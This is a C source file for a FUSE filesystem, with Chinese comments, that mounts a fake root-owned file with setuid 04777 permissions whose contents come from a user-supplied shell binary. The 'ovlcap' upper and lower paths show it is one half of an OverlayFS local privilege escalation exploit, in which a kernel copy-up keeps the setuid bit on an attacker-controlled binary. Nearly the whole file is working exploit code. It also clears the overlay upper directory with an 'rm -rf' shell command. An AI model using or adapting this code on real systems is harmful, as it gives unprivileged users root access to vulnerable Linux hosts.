#define FUSE_USE_VERSION 29
#include <errno.h>
#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>

char content[0x100000];
int clen;
// static char mount_path[] = "./ovlcap/lower3";
static char mount_path[0x100];
static char shell_path[0x100];
static int cnt = 0;

void fatal(const char *msg)
{
    perror(msg);
    exit(1);
}

static int getattr_callback(const char *path, struct stat *stbuf)
{
    // 对应ls的callback
    puts("[+] getattr_callback");
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/file") == 0)
    {
        puts(path);
        stbuf->st_mode = S_IFREG | 04777; // 为了有suid权限
        // stbuf->st_mode = S_IFLNK | 0777;
        stbuf->st_nlink = 1;
        // stbuf->st_size = strlen(content);
        stbuf->st_uid = 0;
        stbuf->st_gid = 0;
        stbuf->st_size = clen;
        return 0;
    }
    else if (strcmp(path, "/") == 0)
    {
        puts(path);
        stbuf->st_mode = S_IFDIR | 0777; // 为了有suid权限
        // stbuf->st_mode = S_IFLNK | 0777;
        stbuf->st_nlink = 2;
        // stbuf->st_size = strlen(content);
        // stbuf->st_size = clen;
        stbuf->st_uid = 1000;
        stbuf->st_gid = 1000;
        return 0;
    }
    return -ENOENT;
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{ // 对应open
    puts("[+] open_callback");
    puts(path);
    if (strcmp(path, "file") == 0)
    {
        int fd = open("", fi->flags);

        return -errno;
    }
    return 0;
}

// 对应read函数
static int read_callback(const char *path,
                         char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi)
{
    puts("[+] read_callback");
    printf("    cnt  : %d\n", cnt);
    printf("    content  : %s\n", content);
    printf("    clen  : %d\n", clen);
    printf("    path  : %s\n", path);
    printf("    size  : 0x%lx\n", size);
    printf("    offset: 0x%lx\n", offset);
    char tmp;
    if (strcmp(path, "/file") == 0)
    {
        size_t len = clen;
        if (offset >= len)
            return 0;
        if ((size > len) || (offset + size > len))
        {
            memcpy(buf, content + offset, len - offset);
            return len - offset;
        }
        else
        {
            memcpy(buf, content + offset, size);
            return size;
        }
    }
    return -ENOENT;
}

int read_buf_callback(const char *path, struct fuse_bufvec **bufp,
                      size_t size, off_t off, struct fuse_file_info *fi)
{
    puts("[+] read buf callback");
    printf("offset %d\n", off);
    printf("size %d\n", size);
    printf("path %s\n", path);
    struct fuse_bufvec *src;

    src = malloc(sizeof(struct fuse_bufvec));
    if (src == NULL)
        return -ENOMEM;

    // size_t len = clen;
    // if (off >= len)
    //     return 0;
    // if ((size > len) || (offset + size > len))
    // {
    //     memcpy(buf, content + offset, len - offset);
    //     return len - offset;
    // }
    // else
    // {
    //     memcpy(buf, content + offset, size);
    //     return size;
    // }

    *src = FUSE_BUFVEC_INIT(size);
    // src->buf[0].flags = FUSE_BUF_IS_FD | FUSE_BUF_FD_SEEK;
    // src->buf[0].fd = fi->fh;
    char *data = malloc(size);
    // strcpy(data, "hello worldaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    memset(data, 0, size);
    memcpy(data, content, size);
    src->buf[0].flags = FUSE_BUF_FD_SEEK;
    src->buf[0].pos = off;
    src->buf[0].mem = data;

    *bufp = src;

    return 0;
}

static int ioctl_callback(const char *p, int cmd, void *arg,
                          struct fuse_file_info *fi, unsigned int flags, void *data)
{
    puts("[+] ioctl callback");
    printf("path %s\n", p);
    printf("cmd 0x%x\n", cmd);
    return 0;
}

static int readdir_callback(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi)
{
    puts("[+] readdir");
    filler(buf, "file", NULL, 0);
    return 0;
}

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
    .read_buf = read_buf_callback,
    .ioctl = ioctl_callback,
    .readdir = readdir_callback,
};

void start_fuse()
{
    // mk mount path
    if (mkdir(mount_path, 0777))
        perror("mkdir");
    system("rm -rf ./ovlcap/upper/*");

    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan;
    struct fuse *fuse;

    if (!(chan = fuse_mount(mount_path, &args)))
        fatal("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
    {
        fuse_unmount(mount_path, chan);
        fatal("fuse_new");
    }

    fuse_set_signal_handlers(fuse_get_session(fuse)); // 设置监听，当程序退出(接收到SIGINT信号)是会终止退出
    fuse_loop_mt(fuse);                               // 监视对文件系统的操作事件
    fuse_unmount(mount_path, chan);
}

int main(int argc, char const *argv[])
{
    // strcpy(content, "hello world!");
    // clen = strlen(content);
    if (argc < 3)
    {
        puts("[-] usage:");
        puts("./fuse [mount path] [shell path]");
        return -1;
    }
    strcpy(mount_path, argv[1]);
    strcpy(shell_path, argv[2]);

    int fd = open(shell_path, O_RDONLY);
    if (fd < 0)
    {
        fatal("open gc");
    }
    clen = 0;
    while (read(fd, content + clen, 1) > 0)
        clen++;
    close(fd);

    printf("[+] len of gc: 0x%x\n", clen);

    start_fuse();
    rmdir(mount_path);
    return 0;
}
